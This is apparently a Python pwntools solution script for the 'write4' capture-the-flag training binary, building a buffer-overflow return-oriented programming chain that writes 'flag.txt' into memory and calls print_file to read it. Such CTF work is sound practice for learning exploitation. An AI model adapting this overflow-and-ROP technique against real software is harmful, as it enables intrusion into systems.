from pwn import *
import sys

# nm callme | grep ' t '
# 0000000000400617 t usefulFunction
# 0000000000400628 t usefulGadgets

binary = './write4'
if len(sys.argv) == 2:
    r = gdb.debug([binary], '''
    b *0x40060b
    ''')
else:
    r = process([binary])

def write_str(addr, s):
    pop_r14_r15 = 0x400690
    write_r15_at_r14 = 0x400628
    
    n = 8
    blocks = [s[i:i+n] for i in range(0, len(s), n)]

    chain = ''
    for i, block in enumerate(blocks):
        block = int(block[::-1].encode('hex'), 16)
        chain += p64(pop_r14_r15) + p64(addr + i * n) + p64(block)
        chain += p64(write_r15_at_r14)

    return chain

where_write = 0x601028
print_file_addr = 0x400510
ret_addr = 0x400616
pop_rdi = 0x400693

chain = write_str(where_write, 'flag.txt\x00')
chain += p64(pop_rdi) + p64(where_write)
chain += p64(print_file_addr)

payload = 'A' * cyclic_find('kaaalaaa') + chain
r.sendline(payload)

r.interactive()

